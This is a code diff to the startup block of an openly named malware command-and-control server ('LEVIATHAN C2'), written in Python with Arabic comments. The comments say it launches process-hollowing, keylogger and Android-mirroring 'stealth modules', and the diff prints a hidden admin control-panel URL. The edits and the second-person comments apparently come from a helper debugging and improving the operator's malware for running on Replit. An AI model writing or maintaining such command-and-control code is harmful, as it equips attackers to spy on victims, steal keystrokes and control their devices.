@@ -1,8 +1,19 @@
 if __name__ == '__main__':
-    # 1. تشغيل الوحدات الثلاث (Hollowing, Keylogger, Android Mirror)
+    # 1. إعداد السجلات وقاعدة البيانات أولاً (تأكد أن الدوال معرفة فوق)
+    setup_intelligence_db() 
+    
+    # 2. تشغيل الوحدات الثلاث 
+    # ملاحظة: سيحاول السيرفر تجميعهم، إذا كنت في Replit سيظهر لك نجاح أو خطأ حسب المترجمات المتاحة
     print("[!] INITIALIZING LEVIATHAN HYBRID MODULES...")
-    launch_stealth_modules()
+    try:
+        launch_stealth_modules()
+    except Exception as e:
+        print(f"[-] Initial Module Boot Failed: {e}")
 
-    # 2. تشغيل سيرفر الـ Flask الأصلي الخاص بك (الـ 400 سطر الباقية)
-    print(f"[*] LEVIATHAN C2 SERVER STARTING ON PORT 8080")
+    # 3. تشغيل السيرفر الرئيسي
+    # ملاحظة: في Replit يفضل استخدام المنفذ 8080 كما فعلت ليظهر الـ Webview
+    print(f"[*] LEVIATHAN C2 ONLINE - ADMIN:")
+    print(f"http://0.0.0.0:8080/control_panel_leviathan_99")
+    
+    # ابقِ debug=False في الإنتاج لتجنب إعادة تشغيل الوحدات مرتين
     app.run(host='0.0.0.0', port=8080, debug=False)
